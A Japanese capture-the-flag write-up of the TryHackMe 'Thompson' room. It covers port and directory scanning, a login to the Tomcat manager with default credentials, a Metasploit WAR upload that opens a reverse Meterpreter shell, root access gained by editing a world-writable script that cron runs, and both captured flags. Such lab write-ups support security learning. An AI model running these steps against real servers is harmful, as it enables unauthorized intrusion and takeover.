# Thompson CTF

https://tryhackme.com/r/room/bsidesgtthompson

tomcatの画面が表示される

## 偵察

### ポートスキャン

```shell
$ TARGET=10.10.99.186
sudo nmap -sS $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 23:16 EST
Nmap scan report for 10.10.99.186
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy

$ sudo nmap -sV -p22,8009,8080 $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 23:17 EST
Nmap scan report for 10.10.99.186
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### whatweb

```shell
$ whatweb -v http://$TARGET:8080
WhatWeb report for http://10.10.99.186:8080
Status    : 200 OK
Title     : Apache Tomcat/8.5.5
IP        : 10.10.99.186
Country   : RESERVED, ZZ

Summary   : HTML5

Detected Plugins:
[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


HTTP Headers:
        HTTP/1.1 200 
        Content-Type: text/html;charset=UTF-8
        Transfer-Encoding: chunked
        Date: Sun, 22 Dec 2024 04:24:35 GMT
        Connection: close
```

### dirb

```shell
$ dirb http://$TARGET:8080 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 21 23:23:20 2024
URL_BASE: http://10.10.99.186:8080/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.99.186:8080/ ----
+ http://10.10.99.186:8080/docs (CODE:302|SIZE:0)                                                                                                                                                                                          
+ http://10.10.99.186:8080/examples (CODE:302|SIZE:0)                                                                                                                                                                                      
+ http://10.10.99.186:8080/favicon.ico (CODE:200|SIZE:21630)                                                                                                                                                                               
+ http://10.10.99.186:8080/host-manager (CODE:302|SIZE:0)                                                                                                                                                                                  
+ http://10.10.99.186:8080/manager (CODE:302|SIZE:0)                                                                                                                                                                                       
                                                                                                                                                                                                                                           
-----------------
END_TIME: Sat Dec 21 23:42:59 2024
DOWNLOADED: 4612 - FOUND: 5
```


```shell
$ searchsploit tomcat 8.5  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                              | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                              | jsp/webapps/42966.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ python ./42966.py -u http://$TARGET:8080

                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                                                                                                  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                                                                                                 
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                                                                                                  
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                                                                                                   
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                                                                                                    
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[@intx0x80]                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```
脆弱性なし


## Tomcat 管理画面
tomcat / s3cret で管理画面に入れた。（Authエラーページに例として書かれていた）

/hgkFDt6wiHIUB29WWEON5PA  
というパスを発見

リクエストしたら0バイトが返っている。謎。
```http
HTTP/1.1 200 

Content-Length: 0

Date: Sun, 22 Dec 2024 04:46:11 GMT
```

### エクスプロイト

管理画面の war ファイルアップロードを利用するエクスプロイト

```shell
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.99.186
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying R5SVuJ2odec1wlKH6K...
[*] Executing R5SVuJ2odec1wlKH6K...
[*] Sending stage (57971 bytes) to 10.10.99.186
[*] Undeploying R5SVuJ2odec1wlKH6K ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.2.22.182:4444 -> 10.10.99.186:59464) at 2024-12-22 00:05:56 -0500

meterpreter > 
```

meterpreter 起動成功。

```shell
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
tomcat
ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Aug 14  2019 .
drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
drwxr-xr-x  4 jack jack 4096 Aug 23  2019 jack
ls -al /home/jack
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Dec 21 21:09 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
cat /home/jack/user.txt
39400c90bc683a41a8935e4719f181bf
```
flag1ゲット。

## 権限昇格

```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
jack:x:1000:1000:tom,,,:/home/jack:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
tomcat:x:1001:1001::/opt/tomcat:/bin/bash
```

```shell
cat /home/jack/test.txt
uid=0(root) gid=0(root) groups=0(root)

cat /home/jack/.wget-hsts
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>[:<port>]   <incl. subdomains>      <created>       <max-age>
gist.githubusercontent.com      0       0       1565801890      31536000

cat /home/jack/id.sh
#!/bin/bash
id > test.txt

cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
```

root が cron で /home/jack/id.sh を実行している。  
id.sh は誰でも編集できるので、/root の中を見るコマンドを書けばよい。

```shell
echo '#!/bin/sh' > /home/jack/id.sh
echo 'ls -al /root > ls.txt' >> /home/jack/id.sh

cat /home/jack/id.sh
#!/bin/sh
ls -al /root > ls.txt

ls /home/jack
id.sh
ls.txt
test.txt
user.txt

cat /home/jack/ls.txt
total 24
drwx------  3 root root 4096 Aug 14  2019 .
drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Aug 14  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 14  2019 root.txt

echo '#!/bin/sh' > /home/jack/id.sh
echo 'cat /root/root.txt > root.txt' >> /home/jack/id.sh

cat /home/jack/id.sh
#!/bin/sh
cat /root/root.txt > root.txt

ls /home/jack
id.sh
ls.txt
root.txt
test.txt
user.txt

cat /home/jack/root.txt
d89d5391984c0450a95497153ae7ca3a
```
rootフラグゲット！

## 振り返り
- Tomcat管理画面の脆弱なパスワードはシェルを奪われる
- 権限昇格は考える要素無し
